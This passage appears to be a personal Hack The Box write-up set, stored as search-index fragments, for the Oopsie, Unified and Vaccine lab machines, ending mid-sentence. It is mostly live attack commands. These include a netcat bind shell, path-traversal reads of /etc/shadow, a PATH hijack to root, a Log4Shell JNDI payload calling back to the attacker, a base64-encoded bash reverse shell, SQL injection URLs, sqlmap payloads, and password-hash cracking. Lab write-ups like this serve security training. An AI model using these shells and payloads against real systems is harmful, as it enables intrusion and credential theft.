/etc/*release\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=18.04\nDISTRIB_CODENAME=bionic\nDISTRIB_DESCRIPTION=\"Ubuntu 18.04.3 LTS\"\nNAME=\"Ubuntu\"\nVERSION=\"18.04.3 LTS (Bionic Beaver)\"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=\"Ubuntu 18.04.3 LTS\"\nVERSION_ID=\"18.04\"\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nVERSION_CODENAME=bionic\nUBUNTU_CODENAME=bionic\n</code></pre> <ul> <li>sudo [x]</li> <li>suid guid [x]</li> <li>find the file with passwords</li> </ul> <pre><code>$ pwd\n/var/www/html/cdn-cgi/login\n$ ls -al\ntotal 28\ndrwxr-xr-x 2 root root 4096 Jul 28  2021 .\ndrwxr-xr-x 3 root root 4096 Jul 28  2021 ..\n-rw-r--r-- 1 root root 6361 Apr 15  2021 admin.php\n-rw-r--r-- 1 root root   80 Jan 24  2020 db.php\n-rw-r--r-- 1 root root 5349 Apr 15  2021 index.php\n-rw-r--r-- 1 root root    0 Jan 24  2020 script.js\n\n$ cat db.php\n&lt;?php\n$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');\n?&gt;\n</code></pre> <ul> <li><code>$ su robert</code></li> </ul> <pre><code>su: must be run from a terminal -&gt; su [x]\n</code></pre> <ul> <li> <p>shell interactive is not very good; need to be improved</p> </li> <li> <p>new a pipe f and set a new listen port service runing a shell</p> </li> </ul> <pre><code>$ rm /tmp/f;mkfifo /tmp/f\nrm: cannot remove '/tmp/f': No such file or directory\n$ cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -l 4444 &gt;/tmp/f\n$ cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -l 4444 &gt;/tmp/f\n</code></pre> <ul> <li>generate a better shell</li> </ul> <pre><code>#local\nnc $IP 4444\nexport TERM=xterm-color\ndpkg -l | grep python\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <ul> <li>su robert</li> </ul>"},{"location":"Write-ups/thb/starting_point/Oopsie/#robert-root","title":"robert-&gt;root","text":"<ul> <li>robert enumeration</li> </ul> <pre><code>robert@oopsie:/$ id\nuid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)\nrobert@oopsie:/$ sudo -l [x]\n[sudo] password for robert:\nSorry, user robert may not run sudo on oopsie.\nrobert@oopsie:/$ ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:b0:e9:ee brd ff:ff:ff:ff:ff:ff\n    inet 10.129.95.191/16 brd 10.129.255.255 scope global ens160\n       valid_lft forever preferred_lft forever\n    inet6 dead:beef::250:56ff:feb0:e9ee/64 scope global dynamic mngtmpaddr\n       valid_lft 86393sec preferred_lft 14393sec\n    inet6 fe80::250:56ff:feb0:e9ee/64 scope link\n       valid_lft forever preferred_lft forever\n</code></pre> <ul> <li> <p>find groups: robert + bugtracker</p> </li> <li> <p>find -perm u=s -type f 2&gt;/dev/null [x]</p> </li> <li>find -perm g=s -type f 2&gt;/dev/null [x]</li> <li>find -group bugtracker -type f 2&gt;/dev/null</li> </ul> <pre><code>robert@oopsie:~$ find / -group bugtracker 2&gt;/dev/null\n/usr/bin/bugtracker\n\nrobert@oopsie:~$ /usr/bin/bugtracker\n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: aaa\n---------------\n\ncat: /root/reports/aaa: No such file or directory\n</code></pre> <ul> <li>shadow crack [x, unimplemented road]</li> <li>john crack [x]</li> </ul> <pre><code>robert@oopsie:~$ /usr/bin/bugtracker\n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: ../../etc/shadow\n---------------\n\nroot:$6$eD0n5saZ$orykpdd7mVL/lF57rIGwUzeSROPC1KRITJ45Nqn6P2BLaZ.tcSOy5fNFcOw9uBRkClgu5R9WlyxpEId5qOOVY.:18285:0:99999:7:::\ndaemon:*:18113:0:99999:7:::\nbin:*:18113:0:99999:7:::\nsys:*:18113:0:99999:7:::\nsync:*:18113:0:99999:7:::\ngames:*:18113:0:99999:7:::\nman:*:18113:0:99999:7:::\nlp:*:18113:0:99999:7:::\nmail:*:18113:0:99999:7:::\nnews:*:18113:0:99999:7:::\nuucp:*:18113:0:99999:7:::\nproxy:*:18113:0:99999:7:::\nwww-data:*:18113:0:99999:7:::\nbackup:*:18113:0:99999:7:::\nlist:*:18113:0:99999:7:::\nirc:*:18113:0:99999:7:::\ngnats:*:18113:0:99999:7:::\nnobody:*:18113:0:99999:7:::\nsystemd-network:*:18113:0:99999:7:::\nsystemd-resolve:*:18113:0:99999:7:::\nsyslog:*:18113:0:99999:7:::\nmessagebus:*:18113:0:99999:7:::\n_apt:*:18113:0:99999:7:::\nlxd:*:18113:0:99999:7:::\nuuidd:*:18113:0:99999:7:::\ndnsmasq:*:18113:0:99999:7:::\nlandscape:*:18113:0:99999:7:::\npollinate:*:18113:0:99999:7:::\nsshd:*:18284:0:99999:7:::\nrobert:$6$kriHoPwv$iBt45Fu0g4R0uNWSubfjDRvtUSwxVu.U1JhYKmT4voMWlVc3/u2nu0j0JZL0YWmm62vRgAs4acBl8Ge.S393H/:18285:0:99999:7:::\nmysql:!:18284:0:99999:7:::\n</code></pre> <pre><code>$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash\nCreated directory: /root/.john\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:32:15 98.85% (ETA: 00:34:22) 0g/s 7332p/s 7332c/s 7332C/s 0165048131..0164614254\n0g 0:00:32:35 DONE (2023-11-22 00:34) 0g/s 7335p/s 7335c/s 7335C/s !!!playboy!!!7..*7\u00a1Vamos!\nSession completed.\n[x]\n</code></pre> <ul> <li>leak root.txt flag (no root priv)</li> </ul> <pre><code>robert@oopsie:~$ /usr/bin/bugtracker\n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: ../../../../../root/root.txt\n---------------\n\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\n*** stack smashing detected ***: &lt;unknown&gt; terminated\nAborted (core dumped)\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Oopsie/#suid-cat","title":"suid cat","text":"<ul> <li>observe bugtracker bin file (file thisbin)</li> </ul> <pre><code>robert@oopsie:/$ /usr/bin/bugtracker\n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: qwe\n---------------\n\ncat: /root/reports/qwe: No such file or directory\n</code></pre> <ul> <li>/usr/bin/bugtracker = cat /root/reports/qwe (is a relative path) -&gt; change PATH under robert let cat run shell as root</li> </ul> <pre><code>robert@oopsie:/$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\nrobert@oopsie:/$ export PATH=/tmp:$PATH\nrobert@oopsie:/$ echo $PATH\n/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\nrobert@oopsie:/$ echo '/bin/bash -p' &gt; /tmp/cat &amp;&amp; chmod +x /tmp/cat\nrobert@oopsie:/$ /usr/bin/bugtracker\n\n------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: qwe\n---------------\n\nroot@oopsie:/# id\nuid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)\nroot@oopsie:/# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:b0:e9:ee brd ff:ff:ff:ff:ff:ff\n    inet 10.129.95.191/16 brd 10.129.255.255 scope global ens160\n       valid_lft forever preferred_lft forever\n    inet6 dead:beef::250:56ff:feb0:e9ee/64 scope global dynamic mngtmpaddr\n       valid_lft 86398sec preferred_lft 14398sec\n    inet6 fe80::250:56ff:feb0:e9ee/64 scope link\n       valid_lft forever preferred_lft forever\nroot@oopsie:/# cd /root\nroot@oopsie:/root# ls\nreports  root.txt\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Unified/","title":"Unified","text":""},{"location":"Write-ups/thb/starting_point/Unified/#machine-info","title":"Machine Info","text":"<p>Tags:</p> <p>Web, Vulnerability Assessment, Databases, Injection, Custom Applications, Outdated Software, MongoDB, Java, Reconnaissance, Clear Text Credentials, Default Credentials, Code Injection</p>"},{"location":"Write-ups/thb/starting_point/Unified/#recon","title":"Recon","text":"<p>concise version:</p> <pre><code>PORT     STATE SERVICE         VERSION\n22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n6789/tcp open  ibm-db2-admin?\n8080/tcp open  http-proxy\n|_http-open-proxy: Proxy might be redirecting requests\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.1 404\n|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage\n8443/tcp open  ssl/nagios-nsca Nagios NSCA\n| http-title: UniFi Network\n|_Requested resource was /manage/account/login?redirect=%2Fmanage\n| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US\n| Subject Alternative Name: DNS:UniFi\n| Not valid before: 2021-12-30T21:37:24\n|_Not valid after:  2024-04-03T21:37:24\n8843/tcp open  ssl/unknown\n| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US\n| Subject Alternative Name: DNS:UniFi\n| Not valid before: 2021-12-30T21:37:24\n|_Not valid after:  2024-04-03T21:37:24\n8880/tcp open  cddbp-alt?\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.1 404\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 431\n|     Date: Tue, 21 Nov 2023 20:01:55 GMT\n|     Connection: close\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Unified/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/starting_point/Unified/#unifi-6454","title":"unifi - 6.4.54","text":"<ul> <li>firefox -&gt; https://10.129.96.149:8443 -&gt; accept risk and visit</li> </ul> <ul> <li>searchsploit to find exp</li> </ul> <pre><code>$ searchsploit unifi network\n----------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                     |  Path\n----------------------------------------------------------------------------------- ---------------------------------\nUbiquiti Networks UniFi 3.2.10 - Cross-Site Request Forgery                        | json/webapps/39488.txt\nUbiquiti Networks UniFi Video Default - 'crossdomain.xml' Security Bypass          | php/webapps/39268.java\n----------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n\n$ searchsploit Ubiquiti\n------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                       |  Path\n------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nUbiquiti Administration Portal - Remote Command Execution (via Cross-Site Request Forgery)                                           | cgi/webapps/40044.html\nUbiquiti airCam RTSP Service 1.1.5 - Buffer Overflow (PoC)                                                                           | hardware/dos/26138.txt\nUbiquiti airOS - Arbitrary File Upload (Metasploit)                                                                                  | unix/remote/39853.rb\nUbiquiti AirOS 5.5.2 - (Authenticated) Remote Command Execution                                                                      | hardware/remote/23735.py\nUbiquiti Networks UniFi 3.2.10 - Cross-Site Request Forgery                                                                          | json/webapps/39488.txt\nUbiquiti Networks UniFi Video Default - 'crossdomain.xml' Security Bypass                                                            | php/webapps/39268.java\nUbiquiti UbiFi / mFi / AirVision - Cross-Site Request Forgery                                                                        | hardware/webapps/34187.txt\nUbiquiti UniFi Video 3.7.3 - Local Privilege Escalation                                                                              | windows/local/43390.txt\n------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <ul> <li>choose: puzzlepeaches/Log4jUnifi: Exploiting CVE-2021-44228 in Unifi Network Application for remote code execution and more. (github.com) and install this tool -&gt; get a shell based on this exp usage</li> </ul> <pre><code>$ python3 exploit.py -u https://10.129.96.149:8443 -i 10.10.15.98 -p 1234\n[*] Starting malicous JNDI Server\n{\"username\": \"${jndi:ldap://10.10.15.98:1389/o=tomcat}\", \"password\": \"log4j\", \"remember\": \"${jndi:ldap://10.10.15.98:1389/o=tomcat}\", \"strict\":true}\n[*] Firing payload!\n[*] Check for a callback!\n\n$ sudo rlwrap nc -lvnp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.15.98] from (UNKNOWN) [10.129.96.149] 33788\nid\nuid=999(unifi) gid=999(unifi) groups=999(unifi)\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Unified/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code>$ sudo nc -lvnp 8899\nlistening on [any] 8899 ...\nconnect to [10.10.15.98] from (UNKNOWN) [10.129.96.149] 47058\nbash: cannot set terminal process group (7): Inappropriate ioctl for device\nbash: no job control in this shell\nunifi@unified:/usr/lib/unifi$ ls\nls\nbin\ndata\ndl\nlib\nlogs\nrun\nwebapps\nwork\nunifi@unified:/usr/lib/unifi$ id\nid\nuid=999(unifi) gid=999(unifi) groups=999(unifi)\n</code></pre> <ul> <li>using /bin/bash to get a better shell</li> </ul>"},{"location":"Write-ups/thb/starting_point/Unified/#mongodb-cred-seeking","title":"mongodb cred seeking","text":"<ul> <li>check procs</li> </ul> <pre><code>unifi@unified:/usr/lib/unifi$ ps aux\nps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nunifi          1  0.0  0.0   1080     4 ?        Ss   19:59   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi\nunifi          7  0.0  0.1  18512  3200 ?        S    19:59   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi\nunifi         17  1.1 22.3 3679540 455460 ?      Sl   19:59   0:53 java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=true -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar start\nunifi         67  0.1  4.1 1100676 85304 ?       Sl   19:59   0:09 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1\nunifi       2121  0.0  0.1  18380  3120 ?        S    21:13   0:00 bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuOTgvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}\nunifi       2124  0.0  0.1  18512  3348 ?        S    21:13   0:00 bash -i\nunifi       2127  0.0  0.1  18380  3172 ?        S    21:13   0:00 bash\nunifi       2207  0.0  0.1  18512  3532 ?        S    21:16   0:00 /bin/bash -i\nunifi       2315  0.0  0.1  34408  2952 ?        R    21:20   0:00 ps aux\n</code></pre> <ul> <li>find java's unifi and mongod are in the same project. And mongod's port is 27117 -&gt; unifi's dataset is mongodb !!!</li> <li>conn mongdb -&gt; get sensitive data</li> </ul> <pre><code>unifi@unified:/usr/lib/unifi$ mongo --port 27117\nmongo --port 27117\nMongoDB shell version v3.6.3\nconnecting to: mongodb://127.0.0.1:27117/\nMongoDB server version: 3.6.3\n\nshow dbs\nace       0.002GB\nace_stat  0.000GB\nadmin     0.000GB\nconfig    0.000GB\nlocal     0.000GB\n\n$ use ace\nswitched to db ace\n\n$ db.admin.find({\"name\":\"administrator\"})\n\n$ db.admin.find({}, {name: 1})\n</code></pre> <ul> <li>change x-shadow in order to change password of admin</li> </ul> <pre><code>db.admin.find().pretty()\n{\n        \"_id\" : ObjectId(\"61ce278f46e0fb0012d47ee4\"),\n        \"name\" : \"administrator\",\n        \"email\" : \"administrator@unified.htb\",\n        \"x_shadow\" : \"$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.\",\n        \"time_created\" : NumberLong(1640900495),\n        \"last_site_name\" : \"default\",\n        \"ui_settings\" : { ...\n</code></pre> <pre><code>db.admin.updateOne(\n   { \"name\": \"administrator\" },\n   { $set: { \"x_shadow\": \"$6$Xolj1ebW9aRM/8xt$wj.BXJW73pUViZmZZhVyOqsyF35nlKx9t58gO2oLPbkhilOrDdyIQEvZjBYSjN9Dl5Dq6rOcA5rKC7/YtUTEt.\" } }\n)\n{ \"acknowledged\" : true, \"matchedCount\" : 1, \"modifiedCount\" : 1 }\n</code></pre> <ul> <li>another method to update user's x-shadow</li> </ul> <pre><code>db.admin.update(\n   { \"name\": \"administrator\" },\n   { $set: { \"x_shadow\": \"new_value\" } },\n   { multi: false }\n)\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Unified/#unifi-root","title":"unifi -&gt; root","text":"<ul> <li><code>su: must be run from a terminal</code> -&gt; update shell</li> </ul> <pre><code>unifi@unified:/usr/lib/unifi$ su administrator\nsu administrator\nsu: must be run from a terminal\n/usr/bin/script -qc /bin/bash /dev/null\n</code></pre> <ul> <li>su root -&gt; password wrong [x] change x-shadow does not alter shadow file -&gt; Unifi login pass</li> </ul> <ul> <li>find cred to ssh conn into the server</li> </ul>"},{"location":"Write-ups/thb/starting_point/Unified/#failed-road","title":"Failed Road","text":"<ul> <li>instead of replacing x-shadow, crack hash [x]</li> <li><code>$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4. - SHA-256</code></li> <li>hashcat [x]</li> <li>john [x]</li> </ul>"},{"location":"Write-ups/thb/starting_point/Vaccine/","title":"Vaccine","text":""},{"location":"Write-ups/thb/starting_point/Vaccine/#machine-info","title":"Machine Info","text":"<p>Tags:</p> <p>Web, Network, Vulnerability Assessment, Databases, Injection, Custom Applications, Protocols, Source Code Analysis, Apache, PostgreSQL, FTP, PHP, Reconnaissance, Password Cracking, SUDO Exploitation, SQL Injection, Remote Code Execution, Clear Text Credentials, Anonymous/Guest Access</p>"},{"location":"Write-ups/thb/starting_point/Vaccine/#recon","title":"Recon","text":"<pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-22 01:43 CST\nNmap scan report for 10.129.103.216\nHost is up (0.30s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.10.15.98\n|      Logged in as ftpuser\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 3\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip\n22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)\n|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)\n|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-title: MegaCorp Login\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Vaccine/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/starting_point/Vaccine/#21-ftp","title":"21 - ftp","text":"<ul> <li>download a bak file</li> </ul> <pre><code>$ ftp $IP\nConnected to 10.129.103.216.\n220 (vsFTPd 3.0.3)\nName (10.129.103.216:qwe): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||10013|)\n150 Here comes the directory listing.\n-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip\n226 Directory send OK.\nftp&gt; binary\n200 Switching to Binary mode.\nftp&gt; get backup.zip\nlocal: backup.zip remote: backup.zip\n229 Entering Extended Passive Mode (|||10208|)\n150 Opening BINARY mode data connection for backup.zip (2533 bytes).\n100% |************************************************************************|  2533        1.97 MiB/s    00:00 ETA\n226 Transfer complete.\n2533 bytes received in 00:00 (8.90 KiB/s)\n</code></pre> <ul> <li>john to crack zip file</li> </ul> <pre><code>$ unzip backup.zip\nArchive:  backup.zip\n[backup.zip] index.php password:\n   skipping: index.php               incorrect password\n   skipping: style.css               incorrect password\n\n$ zip2john backup.zip &gt; hash\nver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8\nver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8\nNOTE: It is assumed that all files in each archive have the same password.\nIf that is not the case, the hash may be uncrackable. To avoid this, use\noption -o to pick a file at a time.\n\n$ john hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, almost any other key for status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nProceeding with wordlist:/usr/share/john/password.lst\n741852963        (backup.zip)\n1g 0:00:00:00 DONE 2/3 (2023-11-22 01:51) 33.33g/s 2560Kp/s 2560Kc/s 2560KC/s 123456..ferrises\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <ul> <li>unzip bak file and get encrypted cred -&gt; hashcat to crack hash</li> </ul> <pre><code>&lt;?php\nsession_start();\n  if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {\n    if($_POST['username'] === 'admin' &amp;&amp; md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\") {\n      $_SESSION['login'] = \"true\";\n      header(\"Location: dashboard.php\");\n    }\n  }\n?&gt;\n</code></pre> <ul> <li>2cb42f8734ea607eefed3b70af13bbd3 (md5 encryption) -&gt; decrypt -&gt; hashcat</li> </ul> <pre><code>$ hashcat -m 0 -a 0 hash1 /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n\n$ hashcat -m 0 -a 0 hash1 /usr/share/wordlists/rockyou.txt --show\n2cb42f8734ea607eefed3b70af13bbd3:qwerty789\n</code></pre> <ul> <li>admin:qwerty789 -&gt; from index.php.bak, so cred for website login page, not ssh login</li> </ul>"},{"location":"Write-ups/thb/starting_point/Vaccine/#80-http","title":"80 - http","text":""},{"location":"Write-ups/thb/starting_point/Vaccine/#sqli-passwd-hash-crack","title":"sqli -&gt; passwd hash -&gt; crack","text":"<ul> <li> <p>utilize sqli to get info (especially user info)</p> </li> <li> <p>test column_size</p> </li> </ul> <pre><code>http://10.129.103.216/dashboard.php?search=Sandy' order by 1 -- - [y]\n...\nhttp://10.129.103.216/dashboard.php?search=Sandy' order by 6 -- - [x]\n</code></pre> <ol> <li>check visible column</li> </ol> <pre><code>http://10.129.103.216/dashboard.php?search=XXX'; select 1,2,3,4,5 -- -\n</code></pre> <p></p> <p></p> <ul> <li> <p>2,3,4,5 is visbile</p> </li> <li> <p>enumerate databases</p> </li> </ul> <pre><code>http://10.129.103.216/dashboard.php?search=XXX'; select 1,schema_name,3,4,5 from information_schema.schemata -- -\n```\ninformation_schema\npublic: cars [x]\npg_catalog: pg_shadow, pg_user, pg_user_mapping\npg_toast_temp_1 [x]\npg_temp_1 [x]\npg_toast [x]\n```\n\nget table name\nhttp://10.129.103.216/dashboard.php?search=XXX'; select 1,table_name,3,4,5 from information_schema.tables where table_schema='public'  -- -\n\nget column name\n\nhttp://10.129.103.216/dashboard.php?search=XXX'; select 1,column_name,3,4,5 from information_schema.columns where table_schema='pg_catalog' and table_name='pg_user' -- -\n</code></pre> <p></p> <ul> <li>get username and encrypted password, <code>http://10.129.103.216/dashboard.php?search=XXX'; select 1,usename,usesuper,passwd,usesysid from pg_catalog.pg_shadow -- -</code></li> </ul> <p></p>"},{"location":"Write-ups/thb/starting_point/Vaccine/#sqlmap","title":"sqlmap","text":"<pre><code>$ sqlmap -u 'http://10.129.103.216/dashboard.php?search=XXX' --cookie=\"PHPSESSID=msujkn8q27o5r35u5nep9l1f16\" --batch --level 5\n\n[03:06:52] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 131 HTTP(s) requests:\n---\nParameter: search (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: search=XXX' AND 2841=(SELECT (CASE WHEN (2841=2841) THEN 2841 ELSE (SELECT 8598 UNION SELECT 2403) END))-- XznC\n\n    Type: error-based\n    Title: PostgreSQL AND error-based - WHERE or HAVING clause\n    Payload: search=XXX' AND 5770=CAST((CHR(113)||CHR(113)||CHR(107)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5770=5770) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC)-- LnCN\n\n    Type: stacked queries\n    Title: PostgreSQL &gt; 8.1 stacked queries (comment)\n    Payload: search=XXX';SELECT PG_SLEEP(5)--\n\n    Type: time-based blind\n    Title: PostgreSQL &gt; 8.1 AND time-based blind\n    Payload: search=XXX' AND 2951=(SELECT 2951 FROM PG_SLEEP(5))-- wkGg\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 5 columns\n    Payload: search=XXX' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(113)||CHR(107)||CHR(106)||CHR(113))||(CHR(99)||CHR(66)||CHR(74)||CHR(81)||CHR(97)||CHR(104)||CHR(86)||CHR(117)||CHR(75)||CHR(76)||CHR(66)||CHR(103)||CHR(120)||CHR(76)||CHR(66)||CHR(118)||CHR(101)||CHR(90)||CHR(87)||CHR(106)||CHR(79)||CHR(122)||CHR(87)||CHR(74)||CHR(99)||CHR(107)||CHR(118)||CHR(79)||CHR(76)||CHR(106)||CHR(120)||CHR(104)||CHR(80)||CHR(107)||CHR(73)||CHR(97)||CHR(116)||CHR(99)||CHR(73)||CHR(87))||(CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113))-- mbuE\n---\n[03:06:53] [INFO] the back-end DBMS is PostgreSQL\nweb server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)\nweb application technology: Apache 2.4.41\nback-end DBMS: PostgreSQL\n\nos-shell&gt; which bash\ndo you want to retrieve the command standard output? [Y/n/a] Y\ncommand standard output: '/usr/bin/bash'\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Vaccine/#get-a-shell","title":"get a shell","text":""},{"location":"Write-ups/thb/starting_point/Vaccine/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/starting_point/Vaccine/#ssh-postgres","title":"ssh -&gt; postgres","text":"<ul> <li>collect private key of ssh, connect 